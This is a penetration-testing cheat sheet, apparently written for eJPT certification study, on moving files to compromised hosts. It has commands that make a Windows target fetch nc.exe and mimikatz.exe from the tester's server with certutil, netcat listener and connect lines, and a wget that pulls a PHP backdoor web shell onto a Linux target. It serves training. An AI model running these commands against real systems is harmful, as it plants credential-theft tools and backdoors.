[[Root 𖣂]] | [[eJPT - Cheat Sheets]] | [[eJPT - README]]

<hr>

# Using Netcat

**Server setup and Netcat transfer**

```shell
cd /usr/share/windows-binaries

# We can then setup an HTTP server with Python within this directory
python -m SimpleHTTPServer 80
python3 -m http.server 80

# From the target Windows system, run via terminal the following command
certutil -urlcache -f http://<my_kali_IP>/nc.exe nc.exe

# Now that we have Netcat setup on both systems, we can setup a Netcat listener on the Kali Linux system
nc -nvlp 1234

# We can now connect to the Netcat listener from the Windows Target system using the command line
nc -nv <my_kali_IP> 1234
```

Netcat can also be used to transfer files between a listener and a client.

```shell
# To get started, we can create a file called test.txt on the Kali Linux system with some sample data by running the following command
echo "Hello, this was sent over with Netcat" >> test.txt

# We will now need to setup a Netcat listener on the recipient system, which in this case is the Windows system
nc.exe -nvlp 1234 > test.txt

# On the Kali Linux system, we will need to connect to the listener and send the contents of test.txt through the Netcat connection
nc -nv 10.0.27.35 1234 < test.txt
```

<br>

# Transferring Files to Windows Targets

```shell
# In this case, we will be transferring the mimikatz.exe executable found under the /usr/share/windows-resources/mimikatz/x64 directory on the Kali Linux system
cd /usr/share/windows-resources/mimikatz/x64

# We can then start a web server with Python3 in this directory
python3 -m http.server 80

# We can now navigate back to the meterpreter session on the target system, navigate to the C:\ drive and create the Temp directory
cd C:\\
mkdir Temp
cd Temp

shell

# We can now download the mimikatz.exe executable from the web server being hosted on the Kali Linux system 
certutil -urlcache -f http://<kali_IP>/mimikatz.exe mimikatz.exe
```

<br>

# Transferring Files to Linux Targets

```shell
# We will be transferring the php-backdoor.php file found under /usr/share/webshells/php/ directory on the Kali machine
cd /usr/share/webshells/php/
python3 -m http.server 80

# Navigate back to the command shell session on the target system and download the php-backdoor.php file from the web server being hosted on the Kali linux system
wget http://<kali_IP>/php-backdoor.php
```

<br>

# Useful file locations

- /usr/share/windows-resources/mimikatz/x64
- /usr/share/webshells/php/
